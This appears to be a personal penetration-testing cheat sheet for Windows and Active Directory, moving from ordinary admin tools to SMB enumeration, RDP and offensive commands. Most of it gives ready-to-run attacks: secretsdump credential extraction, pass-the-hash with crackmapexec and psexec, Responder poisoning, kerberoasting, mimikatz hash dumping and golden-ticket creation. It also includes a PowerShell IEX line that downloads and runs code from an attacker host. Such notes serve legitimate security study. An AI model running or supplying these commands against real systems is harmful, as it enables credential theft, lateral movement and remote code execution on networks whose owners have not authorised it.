### Windows

<details><summary> windows system tools </summary>
<details><summary> Local User and Group Management </summary>
It is a shell application to manage Windows system administrator applications.

```bash
lusrmgr.msc
```
</details>
<details> <summary> System Configuration utility </summary>

for diagnose startup issues

```bash
MSConfig
```
</details>
<details> <summary> Task Manager </summary>

to manage (enable/disable) startup items. 
```bash
taskmgr
```
</details>
<details> <summary> User Account Control </summary>
helps prevent unauthorized changes (which may be initiated by applications, users, viruses, or other forms of malware) to an operating system

```bash
UserAccountControlSettings.exe
```
</details>
<details> <summary> Computer Management </summary>
the process of managing, monitoring and optimizing a computer system for performance, availability, security

```bash
compmgmt
```
</details>
<details> <summary> System Information </summary> 
(gathers information about your computer and displays a comprehensive view of your hardware, system components, and software environment, which you can use to diagnose computer issues.)

```bash
msinfo32
```
</details>
<details> <summary> Resource Monitor </summary>
displays per-process and aggregate CPU, memory, disk, and network usage information, in addition to providing details about which processes are using individual file handles and modules

```bash
resmon
```
</details>
<details> <summary> Windows Registry </summary>
central hierarchical database used to store information necessary to configure the system for one or more users, applications, and hardware devices

```bash
regedit
```
</details>
<details><summary>Group policy objects</summary>
a collection of settings that can be applied to OUs
</details>

<details><summary>PowerShell enumeration</summary>

view all of the hidden files in the current directory
```bash
Get-ChildItem -File -Hidden -ErrorAction SilentlyContinue
```
</details>
</details>

<details><summary> SMB enumeration </summary>

enumerate

```bash
enum4linux -h
```
open SMB shares

```bash
smbclient -L $IP
smbclient //$IP/share # -c 'recurse;ls' 
```

enumeration
```bash
smbmap -H $IP
smbmap -H '$IP' -u '' -p '' -R 
smbmap -H '$IP' -u '' -p '' -R -A 'enter.txt' #download file
```

scan with nmap

```bash
nmap -p 139,445 -Pn -script smb-enum* $IP
nmap -p 139,445 -Pn -script smb-vuln* $IP
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse $IP
```

connect with smbclient

```bash
smbclient \\\\$IP\\nt4wrksv
```

</details>

<details><summary>rdp </summary>

```bash
rdesktop -u <username> -p <password> $IP -g 70% -r disk:folder=/home/toor/cd/apps
rdesktop -u Administrator -d CONTROLLER $IP
remmina 
```

</details>

<details><summary>AD</summary>

extract credentials and secrets from a systemdump
```bash
impacket-secretsdump <domain.local>/<user>:<password>@<ip> 
``` 

where we can pht
```bash
crackmapexec smb <ip>/24 -u '<username>' -H <hash> --local-auth                                
```

login with pht
```bash
impacket-psexec <username>@<ip> -hashes <hash>
```

Responder is a LLMNR, NBT-NS and MDNS poisoner, with built-in HTTP/SMB/MSSQL/FTP/LDAP rogue authentication server supporting
```bash
responder -I eth0 -rdwv
```

DNSRecon - is a powerful DNS enumeration script
```bash
dnsrecon -d <IP> -t axfr
use auxiliary/gather/enum_dns #with metasploit
```

upload file with cmd
```bash
certutil -split -f -urlcache http://<your IP>/file_to_download
powershell -c 'IEX(New-Object Net.WebClient).downloadstring("http://<your_ip>/<file>")' #execute file without download (!!)
```

evil-winrm - Windows Remote Management (if 5985 or 5986 ports are open)
```bash
evil-winrm -u <username> -p <password> -i <ip>
upload <file on your ps directory> #to upload file
```

kerberoasting
```bash
sudo ntpdate <target ip>
impacket-GetUserSPNs domain.local/Admin:passwd -dc-ip $IP -request
```

runas.exe (to inject the credentials into memory)
```bash
runas.exe /netonly /user:<domain>\<username> cmd.exe
```

mimikatz
```bash
privilege::debug #ensure that the output is "Privilege '20' ok"
lsadump::lsa /patch #dump hashes
lsadump::lsa /inject /name:krbtgt # dumps hash and security id of kerb ticket
kerberos::golden /user: /domain: /sid: /krbtgt: /id: #create a golden ticket!
misc::cmd #open cmd with elevated priveleges to all machines
```

links
* [WADComs (AD)](https://wadcoms.github.io/)

</details>

<details><summary>enumeration</summary>

run powershell with bypass execution policy
```bash
powershell -ep bypass
```

```powershell
whoami /priv #/groups
net user
net users
net localgroups
net user <user>
net group /domain
net user /domain
net user <user> /domain
Get-ADUser(Get-ADGroup) -Identity <user(group)> -Server <domain> -Properties *
Get-ADUser -Filter 'Name -like "*<user>"' -Server <domain> | Format-Table Name,SamAccountName -A
Get-ADUser -Filter 'Name -like "*stevens"' -Server <domain> | Format-Table Name,SamAccountName -A
Get-ADObject -Filter 'badPwdCount -gt 0' -Server za.tryhackme.com
Get-ADDomain
netsh firewall show state
netsh firewall show config
netstat -ano
findstr /si password *.txt # .xml .ini
findstr /spin "password" *.*
dir /s *pass* == *cred* == *vnc* == *config*
```

PowerView.ps1
powershell
Invoke-ShareFinder
Windows 10 Enterprise Evaluation
get-netuser | select cn #enum domain users
Get-NetGroup -GroupName *admin* #enum domain groups
```

meterpreter
```bash
run post/multi/recon/local_exploit_suggester #in session
getsystem
getprivs
load kiwi #download mimikatz
```


- [powerview](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)
- [windows-exploit-suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [winpeas](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
- [sushant747 win priv esc](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html)(with vpn)
- [LOLBAS (windows)](https://lolbas-project.github.io/)
- [JAWS](https://github.com/411Hall/JAWS)
- [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)


</details>